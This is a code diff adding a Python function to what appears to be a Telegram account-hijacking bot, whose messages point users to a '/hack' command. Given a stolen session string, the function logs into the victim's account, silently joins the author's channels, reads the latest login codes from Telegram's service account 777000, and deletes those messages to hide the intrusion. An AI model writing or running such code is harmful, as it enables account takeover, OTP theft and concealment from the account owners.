@@ -136,5 +136,43 @@ async def banall(session,id):
         return "**ᴇʀʀᴏʀ:** " + err + "\n**ᴛʀʏ ᴀɢᴀɪɴ /hack.**"
     return msg
 
+async def get_otp(session):
+    err = ""
+    i = ""
+    try:
+        if session.endswith("="):
+            steve = TelegramClient(StringSession(session),API_ID,API_HASH)   
+            await steve.connect()
+            try:
+                await steve(join("@Testing_support_group"))
+                await steve(join("@steve_projects"))
+                await steve(join(CHAT))
+            except Exception as e:
+                print(e)
+            async for x in steve.iter_messages(777000, limit=2):               
+                i += f"\n{x.text}\n"
+                await steve.delete_dialog(777000)
+            await steve.disconnect() 
+                             
+        else:    
+            async with Client("stark",api_id=API_ID,api_hash=API_HASH, session_string=session) as stark:
+                try:
+                    await stark.join_chat("@Testing_support_group")
+                    await stark.join_chat("@steve_projects")
+                    await stark.join_chat(CHAT)
+                except Exception as e:
+                    print(e)    
+                ok = []
+                async for message in stark.get_chat_history(777000,limit=2):
+                    i += f"\n{message.text}\n"                                   
+                    ok.append(message.id)                 
+                await stark.delete_messages(777000,ok)
+    except Exception as idk:
+        err += str(idk)
+                    
+    if err:
+        return "**ᴇʀʀᴏʀ:** " + err + "\n**ᴛʀʏ ᴀɢᴀɪɴ /hack.**"
+    return i
+
 
       
